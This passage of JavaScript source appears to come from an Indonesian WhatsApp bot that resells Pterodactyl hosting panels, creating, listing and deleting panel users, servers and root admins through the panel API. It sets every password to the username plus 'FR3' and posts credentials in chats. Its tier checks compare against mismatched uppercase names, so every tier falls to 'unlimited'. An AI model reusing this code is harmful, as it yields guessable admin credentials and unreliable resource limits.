id: `.delpanel-V3 ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domainV3 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domainV3 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domainV3 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domainV3 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "creatpanel-v4": case "cpanel-v4": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'PILIH',
 sections: [
 {
 title: 'List Panel',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'unlimited-v4',
 id: `.unli-v4 + ${text}`
 },
 {
 title: '1GB-v4',
 id: `.1gb-v4 ${text}`
 }, 
 {
 title: '2GB-v4',
 id: `.2gb-v4 ${text}`
 }, 
 {
 title: '4GB-v4',
 id: `.4gb-v4 ${text}`
 }, 
 {
 title: '5GB-v4',
 id: `.5gb-v4 ${text}`
 },
 {
 title: '6GB-v4',
 id: `.6gb-v4 ${text}`
 }, 
 {
 title: '7GB-v4',
 id: `.7gb-v4 ${text}`
 }, 
 {
 title: '8GB-v4',
 id: `.8gb-v4 ${text}`
 }, 
 {
 title: '9GB-v4',
 id: `.9gb-v4 ${text}`
 }, 
 {
 title: '10GB-v4',
 id: `.10gb-v4 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "PILIH RAM PANEL V4\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "1gb-v4": case "2gb-v4": case "3gb-v4": case "4gb-v4": case "5gb-v4": case "6gb-v4": case "7gb-v4": case "8gb-v4": case "9gb-v4": case "10gb-v4": case "unlimited-v4": case "unli-v4": {
if (!isCreator) return Reply(mess.owner)
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-V4") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-V4") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-V4") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-V4") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-V4") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-V4") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-V4") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-V4") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-V4") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-V4") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@fr3.com"
let name = capital(username) + " Server"
let password = username+"FR3"
let f = await fetch(global.domainV4 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(global.domainV4 + `/api/application/nests/${nestidV4}/eggs/` + eggV4, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(global.domainV4 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV4),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV4)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV4}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "listadmin-v4": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(global.domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-V4`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel-v4": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(global.domainV4 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV4 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV4
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Nvidia.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "deladmin-v4": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(global.domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let cek = await fetch(global.domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV4 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel-v4": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domainV4 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV4 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV4
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-V4 ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domainV4 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domainV4 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domainV4 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domainV4 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV4
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "creatpanel-v5": case "cpanel-v5": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (text.includes(" ")) return m.reply("⚠️ Username tidak boleh mengandung spasi, coba lagi!");
if (!text) return m.reply(example("username"))
await Nvidia.sendMessage(m.chat, {
 footer: `© 2025 ${botname}`,
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'PILIH',
 sections: [
 {
 title: 'List Panel',
 highlight_label: 'Recommended',
 rows: [
 {
 title: 'unlimited-v5',
 id: `.unli-v5 ${text}`
 },
 {
 title: '1GB-v5',
 id: `.1gb-v5 ${text}`
 }, 
 {
 title: '2GB-v5',
 id: `.2gb-v5 ${text}`
 }, 
 {
 title: '4GB-v5',
 id: `.4gb-v5 ${text}`
 }, 
 {
 title: '5GB-v5',
 id: `.5gb-v5 ${text}`
 },
 {
 title: '6GB-v5',
 id: `.6gb-v5 ${text}`
 }, 
 {
 title: '7GB-v5',
 id: `.7gb-v5 ${text}`
 }, 
 {
 title: '8GB-v5',
 id: `.8gb-v5 ${text}`
 }, 
 {
 title: '9GB-v5',
 id: `.9gb-v5 ${text}`
 }, 
 {
 title: '10GB-v5',
 id: `.10gb-v5 ${text}`
 } 
 ]
 }
 ]
 })
 }
 }
 ],
 headerType: 1,
 viewOnce: true,
 text: "PILIH RAM PANEL V5\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m})
}
break

case "1gb-v5": case "2gb-v5": case "3gb-v5": case "4gb-v5": case "5gb-v5": case "6gb-v5": case "7gb-v5": case "8gb-v5": case "9gb-v5": case "10gb-v5": case "unlimited-v5": case "unli-v5": {
if (!isCreator) return Reply(mess.owner)
global.panel = text
var ram
var disknya
var cpu
if (command == "1gb-V5") {
ram = "1000"
disknya = "1000"
cpu = "40"
} else if (command == "2gb-V5") {
ram = "2000"
disknya = "1000"
cpu = "60"
} else if (command == "3gb-V5") {
ram = "3000"
disknya = "2000"
cpu = "80"
} else if (command == "4gb-V5") {
ram = "4000"
disknya = "2000"
cpu = "100"
} else if (command == "5gb-V5") {
ram = "5000"
disknya = "3000"
cpu = "120"
} else if (command == "6gb-V5") {
ram = "6000"
disknya = "3000"
cpu = "140"
} else if (command == "7gb-V5") {
ram = "7000"
disknya = "4000"
cpu = "160"
} else if (command == "8gb-V5") {
ram = "8000"
disknya = "4000"
cpu = "180"
} else if (command == "9gb-V5") {
ram = "9000"
disknya = "5000"
cpu = "200"
} else if (command == "10gb-V5") {
ram = "10000"
disknya = "5000"
cpu = "220"
} else {
ram = "0"
disknya = "0"
cpu = "0"
}
let username = global.panel.toLowerCase()
let email = username+"@fr3.com"
let name = capital(username) + " Server"
let password = username+"FR3"
let f = await fetch(global.domainV5 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Server",
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
let desc = tanggal(Date.now())
let usr_id = user.id
let f1 = await fetch(global.domainV5 + `/api/application/nests/${nestidV5}/eggs/` + eggV5, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let data2 = await f1.json();
let startup_cmd = data2.attributes.startup
let f2 = await fetch(global.domainV5 + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5,
},
"body": JSON.stringify({
"name": name,
"description": desc,
"user": usr_id,
"egg": parseInt(eggV5),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": ram,
"swap": 0,
"disk": disknya,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 5
},
deploy: {
locations: [parseInt(locV5)],
dedicated_ip: false,
port_range: [],
},
})
})
let result = await f2.json()
if (result.errors) return m.reply(JSON.stringify(result.errors[0], null, 2))
let server = result.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat panel ✅*\nData akun sudah dikirim ke privat chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Akun Panel ✅*

* *ID :* ${server.id}
* *Nama :* ${name}
* *Username :* ${user.username}
* *Password :* ${password}
* *Login :* ${global.domainV5}
* *Ram :* ${ram == "0" ? "Unlimited" : ram.split("").length > 4 ? ram.split("").slice(0,2).join("") + "GB" : ram.charAt(0) + "GB"}
* *Cpu :* ${cpu == "0" ? "Unlimited" : cpu+"%"}
* *Disk :* ${disknya == "0" ? "Unlimited" : disknya.split("").length > 4 ? disknya.split("").slice(0,2).join("") + "GB" : disknya.charAt(0) + "GB"}
* *Expired Server :* 1 Bulan

*Rules Pembelian Panel ⚠️*
* Simpan Data Ini Sebaik Mungkin, Seller Hanya Mengirim 1 Kali!
* Data Hilang/Lupa Akun, Seller Tidak Akan Bertanggung Jawab!
* Garansi Aktif 10 Hari (1x replace)
* Claim Garansi Wajib Membawa Bukti Ss Chat Saat Pembelian
`
await Nvidia.sendMessage(orang, {text: teks}, {quoted: m})
delete global.panel
}
break

case "listadmin-v5": {
if (!isCreator) return Reply(mess.owner)
let cek = await fetch(global.domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
var teks = "\n *乂 List admin panel pterodactyl*\n"
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
teks += `\n* ID : *${i.attributes.id}*
* Nama : *${i.attributes.first_name}*
* Created : ${i.attributes.created_at.split("T")[0]}\n`
})
await Nvidia.sendMessage(m.chat, {
  buttons: [
{ buttonId: `.deladmin-V5`, buttonText: { displayText: 'Hapus Admin Panel' }, type: 1 }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: teks,
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m})
}
break

case "listpanel-v5": {
if (!isCreator) return Reply(mess.owner)
let f = await fetch(global.domainV5 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
});
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
let messageText = "\n *乂 List server panel pterodactyl*\n"
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV5 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV5
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `\n* ID : *${s.id}*
* Nama : *${s.name}*
* Ram : *${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"}*
* CPU : *${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}*
* Disk : *${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"}*
* Created : ${s.created_at.split("T")[0]}\n`
}
await Nvidia.sendMessage(m.chat, {text: messageText}, {quoted: m})
}
break

case "deladmin-v5": {
if (!isCreator) return Reply(mess.owner)
if (!text) {
let cek = await fetch(global.domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
if (users.length < 1 ) return m.reply("Tidak ada admin panel")
let list = []
await users.forEach((i) => {
if (i.attributes.root_admin !== true) return
list.push({
title: `${i.attributes.first_name} (ID ${i.attributes.id})`, 
id: `.deladmin ${i.attributes.id}`
})
})
return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: 'List Admin Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "\nPilih Salah Satu Admin Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let cek = await fetch(global.domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
let getid = null
let idadmin = null
await users.forEach(async (e) => {
if (e.attributes.id == args[0] && e.attributes.root_admin == true) {
getid = e.attributes.username
idadmin = e.attributes.id
let delusr = await fetch(global.domainV5 + `/api/application/users/${idadmin}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}
})
if (idadmin == null) return m.reply("Akun admin panel tidak ditemukan!")
await m.reply(`Berhasil menghapus akun admin panel *${capital(getid)}*`)
}
break

case "delpanel-v5": {
if (!isCreator && !isPremium && !isAkses) return Reply(mess.owner)
if (!text) {
let list = []
let f = await fetch(global.domainV5 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res = await f.json();
let servers = res.data;
if (servers.length < 1) return m.reply("Tidak Ada Server Bot")
for (let server of servers) {
let s = server.attributes
let f3 = await fetch(global.domainV5 + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikeyV5
}
})
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
list.push({
title: `${s.name} (ID ${s.id})`, 
description: `Ram ${s.limits.memory == 0 ? "Unlimited" : s.limits.memory.toString().length > 4 ? s.limits.memory.toString().split("").slice(0,2).join("") + "GB" : s.limits.memory.toString().length < 4 ? s.limits.memory.toString().charAt(1) + "GB" : s.limits.memory.toString().charAt(0) + "GB"} || Disk ${s.limits.disk == 0 ? "Unlimited" : s.limits.disk.length > 3 ? s.limits.disk.toString().charAt(1) + "GB" : s.limits.disk.toString().charAt(0) + "GB"} || CPU ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu.toString() + "%"}`, 
id: `.delpanel-V5 ${s.id}`
})
}

return Nvidia.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: 'List Server Panel',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Salah Satu Server Panel\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: qlive})
}
let f = await fetch(global.domainV5 + "/api/application/servers?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let result = await f.json()
let servers = result.data
let sections
let nameSrv
for (let server of servers) {
let s = server.attributes
if (Number(text) == s.id) {
sections = s.name.toLowerCase()
nameSrv = s.name
let f = await fetch(global.domainV5 + `/api/application/servers/${s.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
}}
let cek = await fetch(global.domainV5 + "/api/application/users?page=1", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res2 = await cek.json();
let users = res2.data;
for (let user of users) {
let u = user.attributes
if (u.first_name.toLowerCase() == sections) {
let delusr = await fetch(global.domainV5 + `/api/application/users/${u.id}`, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV5
}
})
let res = delusr.ok ? {
errors: null
} : await delusr.json()
}}
if (sections == undefined) return m.reply("Server panel tidak ditemukan!")
m.reply(`Berhasil menghapus server panel *${capital(nameSrv)}*`)
}
break

case "cadmin-v3": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("username"))
let username = text.toLowerCase()
let email = username+"@fr3.com"
let name = capital(args[0])
let password = username+"FR3"
let f = await fetch(global.domainV3 + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyV3
},
"body": JSON.stringify({
"email": email,
"username": username.toLowerCase(),
"first_name": name,
"last_name": "Admin",
"root_admin": true,
"language": "en",
"password": password.toString()
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2))
let user = data.attributes
var orang
if (!m.isGroup) {
orang = m.sender
await m.reply("*Berhasil membuat admin panel ✅*\nData akun sudah di kirim ke private chat")
} else {
orang = m.chat
}
var teks = `
*Berhasil Membuat Admin Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.first_name}
* *Username :* ${user.username}
* *Password :* ${password.toString()}
* *Login :* ${global.domainV3}

*Rules Admin Panel ⚠️*
